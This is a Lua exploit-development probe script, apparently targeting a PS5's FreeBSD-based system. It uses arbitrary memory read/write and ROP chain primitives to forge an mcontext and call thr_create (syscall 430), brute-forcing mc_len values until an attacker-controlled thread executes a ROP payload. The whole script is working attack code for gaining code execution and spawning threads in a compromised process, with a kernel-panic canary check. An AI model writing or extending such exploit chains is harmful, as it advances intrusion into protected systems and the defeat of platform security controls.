-- CRASH_CLASS: HIGH
-- PROBE 126f: thr_create with correct mc_len
-- errno 22 (EINVAL) from 126e — likely mc_len mismatch
-- Try standard FreeBSD 11 sizeof(mcontext_t) values

print("=== PROBE 126f: THR_CREATE MC_LEN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

local sc_thr_create = make_sc(430)

-- Section A: Determine correct mc_len by reading our own context via sigreturn
-- Actually, let's try common values for sizeof(mcontext_t) on FreeBSD amd64
-- Standard FreeBSD 11: 0x320 (800 bytes)
-- FreeBSD 12+: might be different
-- PS5 (custom): could be anything

-- Let's also try getting our own context via getcontext-like call
-- On FreeBSD, sysarch(129, &ctx) does SET_FSBASE but we can try others

-- Instead, let's brute-force mc_len with a few common values
local mc_len_candidates = {0x320, 0x340, 0x330, 0x350, 0x300, 0x348, 0x360, 0x280, 0x400, 0x2D0}

-- Shared proof buffer
local shared = memory.alloc(64)

-- Thread chain (simple: write marker then exit)
local function build_thread_chain()
    local tc = ropchain:new({stack_size = 0x4000})
    tc:push_write_qword_memory(shared, uint64(0xAAAA))
    local sc_thr_exit = make_sc(431)
    tc:push_syscall(sc_thr_exit, 0)
    tc:push_ret()
    return tc.stack_base
end

for idx, mc_len_val in ipairs(mc_len_candidates) do
    memory.write_qword(shared, 0)

    local chain_start = build_thread_chain()

    local UC_SIZE = 0x400
    local ucontext = memory.alloc(UC_SIZE)
    for off = 0, UC_SIZE - 4, 4 do memory.write_dword(ucontext + off, 0) end

    local mc = ucontext + 0x10

    -- CORRECT FreeBSD amd64 mcontext offsets
    memory.write_qword(mc + 0xA0, gadgets.ret)       -- mc_rip
    memory.write_qword(mc + 0xA8, uint64(0x43))      -- mc_cs
    memory.write_qword(mc + 0xB0, uint64(0x202))     -- mc_rflags
    memory.write_qword(mc + 0xB8, chain_start)        -- mc_rsp
    memory.write_qword(mc + 0xC0, uint64(0x3B))      -- mc_ss
    memory.write_qword(mc + 0xC8, uint64(mc_len_val)) -- mc_len
    memory.write_qword(mc + 0xD0, uint64(0x10000))   -- mc_fpformat = _MC_FPFMT_NODEV
    memory.write_qword(mc + 0xD8, uint64(0))         -- mc_ownedfp = 0

    -- Segment registers
    memory.write_dword(mc + 0x90, 0x1)  -- mc_flags = _MC_HASSEGS

    local new_tid_buf = memory.alloc(8)
    memory.write_qword(new_tid_buf, 0)

    local ret_val = 0xDEAD
    local ok, err = pcall(function()
        local chain = ropchain:new()
        chain:push_syscall_with_ret(sc_thr_create, ucontext, new_tid_buf, 0)
        chain:restore_through_longjmp()
        chain:execute_through_coroutine()
        local ret_addr = chain:get_last_retval_addr()
        if ret_addr then ret_val = to_num(memory.read_qword(ret_addr)) end
    end)

    local tid = to_num(memory.read_qword(new_tid_buf))
    local s0 = to_num(memory.read_qword(shared))

    -- Brief wait for thread
    if ret_val == 0 then
        sleep(0.1, 's')
        s0 = to_num(memory.read_qword(shared))
    end

    local tag = ""
    if ret_val == 0 then tag = " *** SUCCESS ***" end
    if s0 == 0xAAAA then tag = tag .. " THREAD_EXECUTED!" end

    print(string.format("mc_len=0x%X: ret=%d tid=%d shared=0x%X%s",
        mc_len_val, ret_val, tid, s0, tag))

    -- If we got a thread, check errno
    if not ok then
        print("  error: " .. tostring(err))
    elseif ret_val ~= 0 then
        local ok_e, es = pcall(get_error_string)
        if ok_e then print("  errno: " .. es) end
    end

    -- Canary
    local canary = pcall(function() return to_num(syscall.getpid()) end)
    if not canary then
        print("  *** KERNEL PANIC - STOPPING ***")
        break
    end

    if s0 == 0xAAAA then
        print("*** THREAD CREATION AND EXECUTION CONFIRMED! ***")
        print("*** mc_len=0x" .. string.format("%X", mc_len_val) .. " is correct ***")
        break
    end
end

print("=== PROBE 126f COMPLETE ===")
